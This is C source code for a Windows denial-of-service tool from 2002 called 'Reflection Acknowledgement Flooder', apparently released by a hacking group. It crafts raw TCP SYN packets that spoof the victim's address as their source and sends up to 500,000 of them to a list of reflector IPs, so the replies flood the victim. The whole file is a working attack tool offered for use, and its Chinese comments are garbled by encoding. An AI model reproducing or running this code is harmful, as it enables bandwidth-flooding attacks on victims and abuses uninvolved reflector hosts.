/////Reflection Acknowledgement Flooder by С�� ��2002��9�£�
/////���Ĵ˴��������һ�ݿ���
/////E-MAIL��LK007@163.com Anpolise@s8s8.net
////============================================
#include <winsock2.h> 
#include <ws2tcpip.h> 

#define false 0
#define true 1

#define SEQ 0x28376839 

int x=-1,k,j;
int rndX=0;

struct IP
{
	char ip[20];
};

struct IP IPtemp[32767];

typedef struct ip_hdr		//	����IP�ײ� 
{
	unsigned char h_verlen;		//	4λ�ײ�����,4λIP�汾�� 
	unsigned char tos;		//	8λ��������TOS 
	unsigned short total_len;	//	16λ�ܳ��ȣ��ֽڣ� 
	unsigned short ident;		//	16λ��ʶ 
	unsigned short frag_and_flags;	//	3λ��־λ 
	unsigned char ttl;		//	8λ����ʱ�� TTL 
	unsigned char proto;		//	8λЭ�� (TCP, UDP ������) 
	unsigned short checksum;	//	16λIP�ײ�У��� 
	unsigned int sourceIP;		//	32λԴIP��ַ 
	unsigned int destIP;		//	32λĿ��IP��ַ 
}IP_HEADER; 

typedef struct tsd_hdr		//	����TCPα�ײ� 
{ 
	unsigned long saddr;	//	Դ��ַ 
	unsigned long daddr;	//	Ŀ�ĵ�ַ 
	char mbz; 
	char ptcl;		//	Э������ 
	unsigned short tcpl;	//	TCP���� 
}PSD_HEADER; 

typedef struct tcp_hdr		//����TCP�ײ� 
{ 
	USHORT th_sport;		//	16λԴ�˿� 
	USHORT th_dport;		//	16λĿ�Ķ˿� 
	unsigned int th_seq;		//	32λ���к� 
	unsigned int th_ack;		//	32λȷ�Ϻ� 
	unsigned char th_lenres;	//	4λ�ײ�����/6λ������ 
	unsigned char th_flag;		//	6λ��־λ 
	USHORT th_win;			//	16λ���ڴ�С 
	USHORT th_sum;			//	16λУ��� 
	USHORT th_urp;			//	16λ��������ƫ���� 
}TCP_HEADER; 

int GetIPNum()
{
	int i;
	if(rndX++==65536) rndX=1; //���к�ѭ�� 
	srand(rndX); 
	i=rand()%x+1;
	return i;
}

//CheckSum:����У��͵��Ӻ��� 
USHORT checksum(USHORT *buffer, int size) 
{ 
	unsigned long cksum=0; 
	while(size >1) 
	{ 
		cksum+=*buffer++; 
		size -=sizeof(USHORT); 
	} 
	if(size ) 
	{ 
		cksum += *(UCHAR*)buffer; 
	} 
	
	cksum = (cksum >> 16) + (cksum & 0xffff); 
	cksum += (cksum >>16); 
	return (USHORT)(~cksum); 
} 

unsigned long resolve(char *host)
{
	long i;
	struct hostent *he;
	
	if ( ( i = inet_addr(host) ) < 0 )
	{
		if ( ( he = gethostbyname(host) ) == NULL )
		{
			return 0;
		}
		else
		{
			return ( *(unsigned long *)he->h_addr );
		}
		return i;
	}
}

void Intro()
{
	printf("==================R-Series=====================\n");
	printf("H.B.U Team R-Series Tools DEMO Version\n");
	printf("\n");
	printf("-=-=-Reflection Acknowledgement Flooder-=-=-\n");
	printf("\n");
	printf("&copy;2002 HBU Team,written by LK007\n");
	printf("E-MAIL:lk007@163.com cjc007@cnuninet.com\n");
	printf("Please visit: www.s8s8.net www.heibai.net\n");
	printf("===============================================\n");
	printf("WARNING!TEST ONLY!\n");
	printf("This Version can only send 500,000 packets!\n\n");
	////printf("RELEASE VERSION,NO PACKET LIMIT!");
}

void LoadFile()
{
	FILE *fp;
	char str[256];
	if((fp=fopen("ack.txt","rt"))==NULL)
	{
		printf("Can not open Reflection-IP List!\n");
		printf("Please create a text file 'ack.txt' which\n");
		printf("includes Reflection-IP(s) on the Application Path!\n");
		exit(0);
	}
	while (!feof(fp))
	{
		fgets(str,sizeof(str),fp);
		x++;
		for (k=0;k<16;k++)
		{
			if(str[k]=='\n'){
				str[k]='\0';}
			
			IPtemp[x].ip[k]=str[k];
		}
	}
	fclose(fp);
	printf("Loading Reflection IP List...\n\n");
	printf("Reflection IP List Loaded.\n");
	printf("\nTotal IP List:%d\n\n",x);
}

int main(int argc, char **argv) 
{ 
	WSADATA WSAData; 
	SOCKET SockRaw; 
	struct sockaddr_in DestAddr; 
	IP_HEADER ip_header; 
	TCP_HEADER tcp_header; 
	PSD_HEADER psd_header; 
	
	char SendBuf[128]={0};
	char FakeSourceIp[20];
	char DestIp[20];
	BOOL flag;
	BOOL TCPNODELAY = true; 
	int SYN,datasize; 
	long counter;
	int SendSEQ=0,TimeOut=2000;
	int intPort=80;
	int destPort=80;
	
	if (argc<2)
	{ 
		Intro();
		printf("Usage: %s [DestIP]\n",argv[0]);
		exit(0); 
	} 
	
	strcpy(FakeSourceIp,argv[1]);
	Intro();
	LoadFile();
	
	
	if (WSAStartup(MAKEWORD(2,2), &WSAData)!=0) 
	{ 
		printf("WSAStartup Error!\n"); 
		return false; 
	} 
	
	if ((SockRaw=WSASocket(AF_INET,SOCK_RAW,IPPROTO_RAW,NULL,0,WSA_FLAG_OVERLAPPED))==INVALID_SOCKET) 
	{ 
		printf("�޷�����Socket�׽���!\n"); 
		return false; 
	} 
	
	flag=true; 
	if (setsockopt(SockRaw,IPPROTO_IP, IP_HDRINCL,(char *)&flag,sizeof(flag))==SOCKET_ERROR) 
	{ 
		printf("����IP����ʧ��!�˳�����ҪWin2000/XP֧��!\n"); 
		return false; 
	} 
	
	SYN=setsockopt(SockRaw,SOL_SOCKET,SO_SNDTIMEO,(char*)&TimeOut,sizeof(TimeOut)); 
	if(SYN==SOCKET_ERROR){ 
		fprintf(stderr,"Failed to set send TimeOut: %d\n",WSAGetLastError()); 
		return false; 
	}
	
	if (setsockopt(SockRaw, SOL_SOCKET, TCP_NODELAY, (const char*)&TCPNODELAY, sizeof(TCPNODELAY))==SOCKET_ERROR) 
	{ 
		printf("Set TCP_NODELAY failed.Error:%d",WSAGetLastError()); 
		return false; 
	} 
	
	printf("Dest Host:%s\n\n",FakeSourceIp);
	
	for ( counter = 0; counter < 500000; counter ++ )
	{
		strcpy( DestIp, IPtemp[GetIPNum()].ip );

		printf("Now using %s for Reflection...\n",DestIp);
		
		memset( &DestAddr, 0, sizeof(DestAddr) ); 
		DestAddr.sin_family		= AF_INET;
		DestAddr.sin_addr.s_addr	= inet_addr(DestIp);

		//	���IP�ײ� 
		ip_header.h_verlen		= ( 4 << 4 | sizeof(ip_header) / sizeof(unsigned long) );

		//	����λIP�汾�ţ�����λ�ײ�����
		ip_header.total_len		= htons( sizeof(IP_HEADER)+sizeof(TCP_HEADER) );	//16λ�ܳ��ȣ��ֽڣ� 
		ip_header.ident			= 1;				//	16λ��ʶ
		ip_header.frag_and_flags	= 0;				//	3λ��־λ
		ip_header.ttl			= 128;				//	8λ����ʱ��TTL 
		ip_header.proto			= IPPROTO_TCP;			//	8λЭ��(TCP,UDP��) 
		ip_header.checksum		= 0;				//	16λIP�ײ�У��� 
		ip_header.sourceIP		= resolve(FakeSourceIp);	//	32λԴIP��ַ 
		ip_header.destIP		= inet_addr(DestIp);		//	32λĿ��IP��ַ

		//	���TCP�ײ�
		tcp_header.th_sport		= htons(destPort);		//	Դ�˿ں� 
		tcp_header.th_dport		= htons(intPort);		//	Ŀ�Ķ˿ں� 
		tcp_header.th_seq		= htonl(SEQ+SendSEQ);		//	SYN���к� 
		tcp_header.th_ack		= 0;				//	ACK���к���Ϊ0 
		tcp_header.th_lenres		= (sizeof(TCP_HEADER)/4<<4|0);	//	TCP���Ⱥͱ���λ 
		tcp_header.th_flag		= 2;				//	SYN ��־ 
		tcp_header.th_win		= htons(16384);			//	���ڴ�С 
		tcp_header.th_urp		= 0;				//	ƫ�� 
		tcp_header.th_sum		= 0;				//	У���

		//	���TCPα�ײ������ڼ���У��ͣ������������ͣ� 
		psd_header.saddr		= ip_header.sourceIP;		//	Դ��ַ
		psd_header.daddr		= ip_header.destIP;		//	Ŀ�ĵ�ַ
		psd_header.mbz			= 0; 
		psd_header.ptcl			= IPPROTO_TCP;			//	Э������ 
		psd_header.tcpl			= htons(sizeof(tcp_header));	//	TCP�ײ����� 

		if ( SendSEQ++ == 65536 )
		{
			//	���к�ѭ��
			SendSEQ	= 1;
		}

		//	����IP�ײ�
		ip_header.checksum		= 0;	//	16λIP�ײ�У��� 
		ip_header.sourceIP		= resolve(FakeSourceIp); //32λԴIP��ַ 

		//	����TCP�ײ�
		tcp_header.th_seq		= htonl(SEQ+SendSEQ); //SYN���к� 
		tcp_header.th_sum		= 0; //У���

		//	���� TCP Pseudo Header
		psd_header.saddr		= ip_header.sourceIP; 
		
		//
		//	�������ݵ� SendBuf��׼������
		//

		//	���� TCP У��ͣ�����У���ʱ��Ҫ���� TCP pseudo header 
		memcpy( SendBuf, &psd_header, sizeof(psd_header) );
		memcpy( SendBuf + sizeof(psd_header), &tcp_header, sizeof(tcp_header) ); 
		tcp_header.th_sum = checksum( (USHORT*)SendBuf, sizeof(psd_header)+sizeof(tcp_header) ); 

		//	����IPУ��� 
		memcpy( SendBuf, &ip_header, sizeof(ip_header) );
		memcpy( SendBuf + sizeof(ip_header), &tcp_header, sizeof(tcp_header) );
		memset( SendBuf + sizeof(ip_header)+sizeof(tcp_header), 0, 4 );
		datasize		= sizeof(ip_header) + sizeof(tcp_header);
		ip_header.checksum	= checksum( (USHORT*)SendBuf, datasize ); 
		
		//	��䷢�ͻ����� 
		memcpy( SendBuf, &ip_header, sizeof(ip_header) ); 

		//	����TCP���� 
		SYN = sendto( SockRaw, SendBuf, datasize, 0, (struct sockaddr*)&DestAddr, sizeof(DestAddr) ); 
		if ( SYN == SOCKET_ERROR )
		{
			printf("\nSend Error:%d\n",GetLastError());
		}

	}
	//	end for 
	closesocket(SockRaw); 
	WSACleanup(); 
	printf("\n\nSend Complete!\n");
	return 0; 
} 
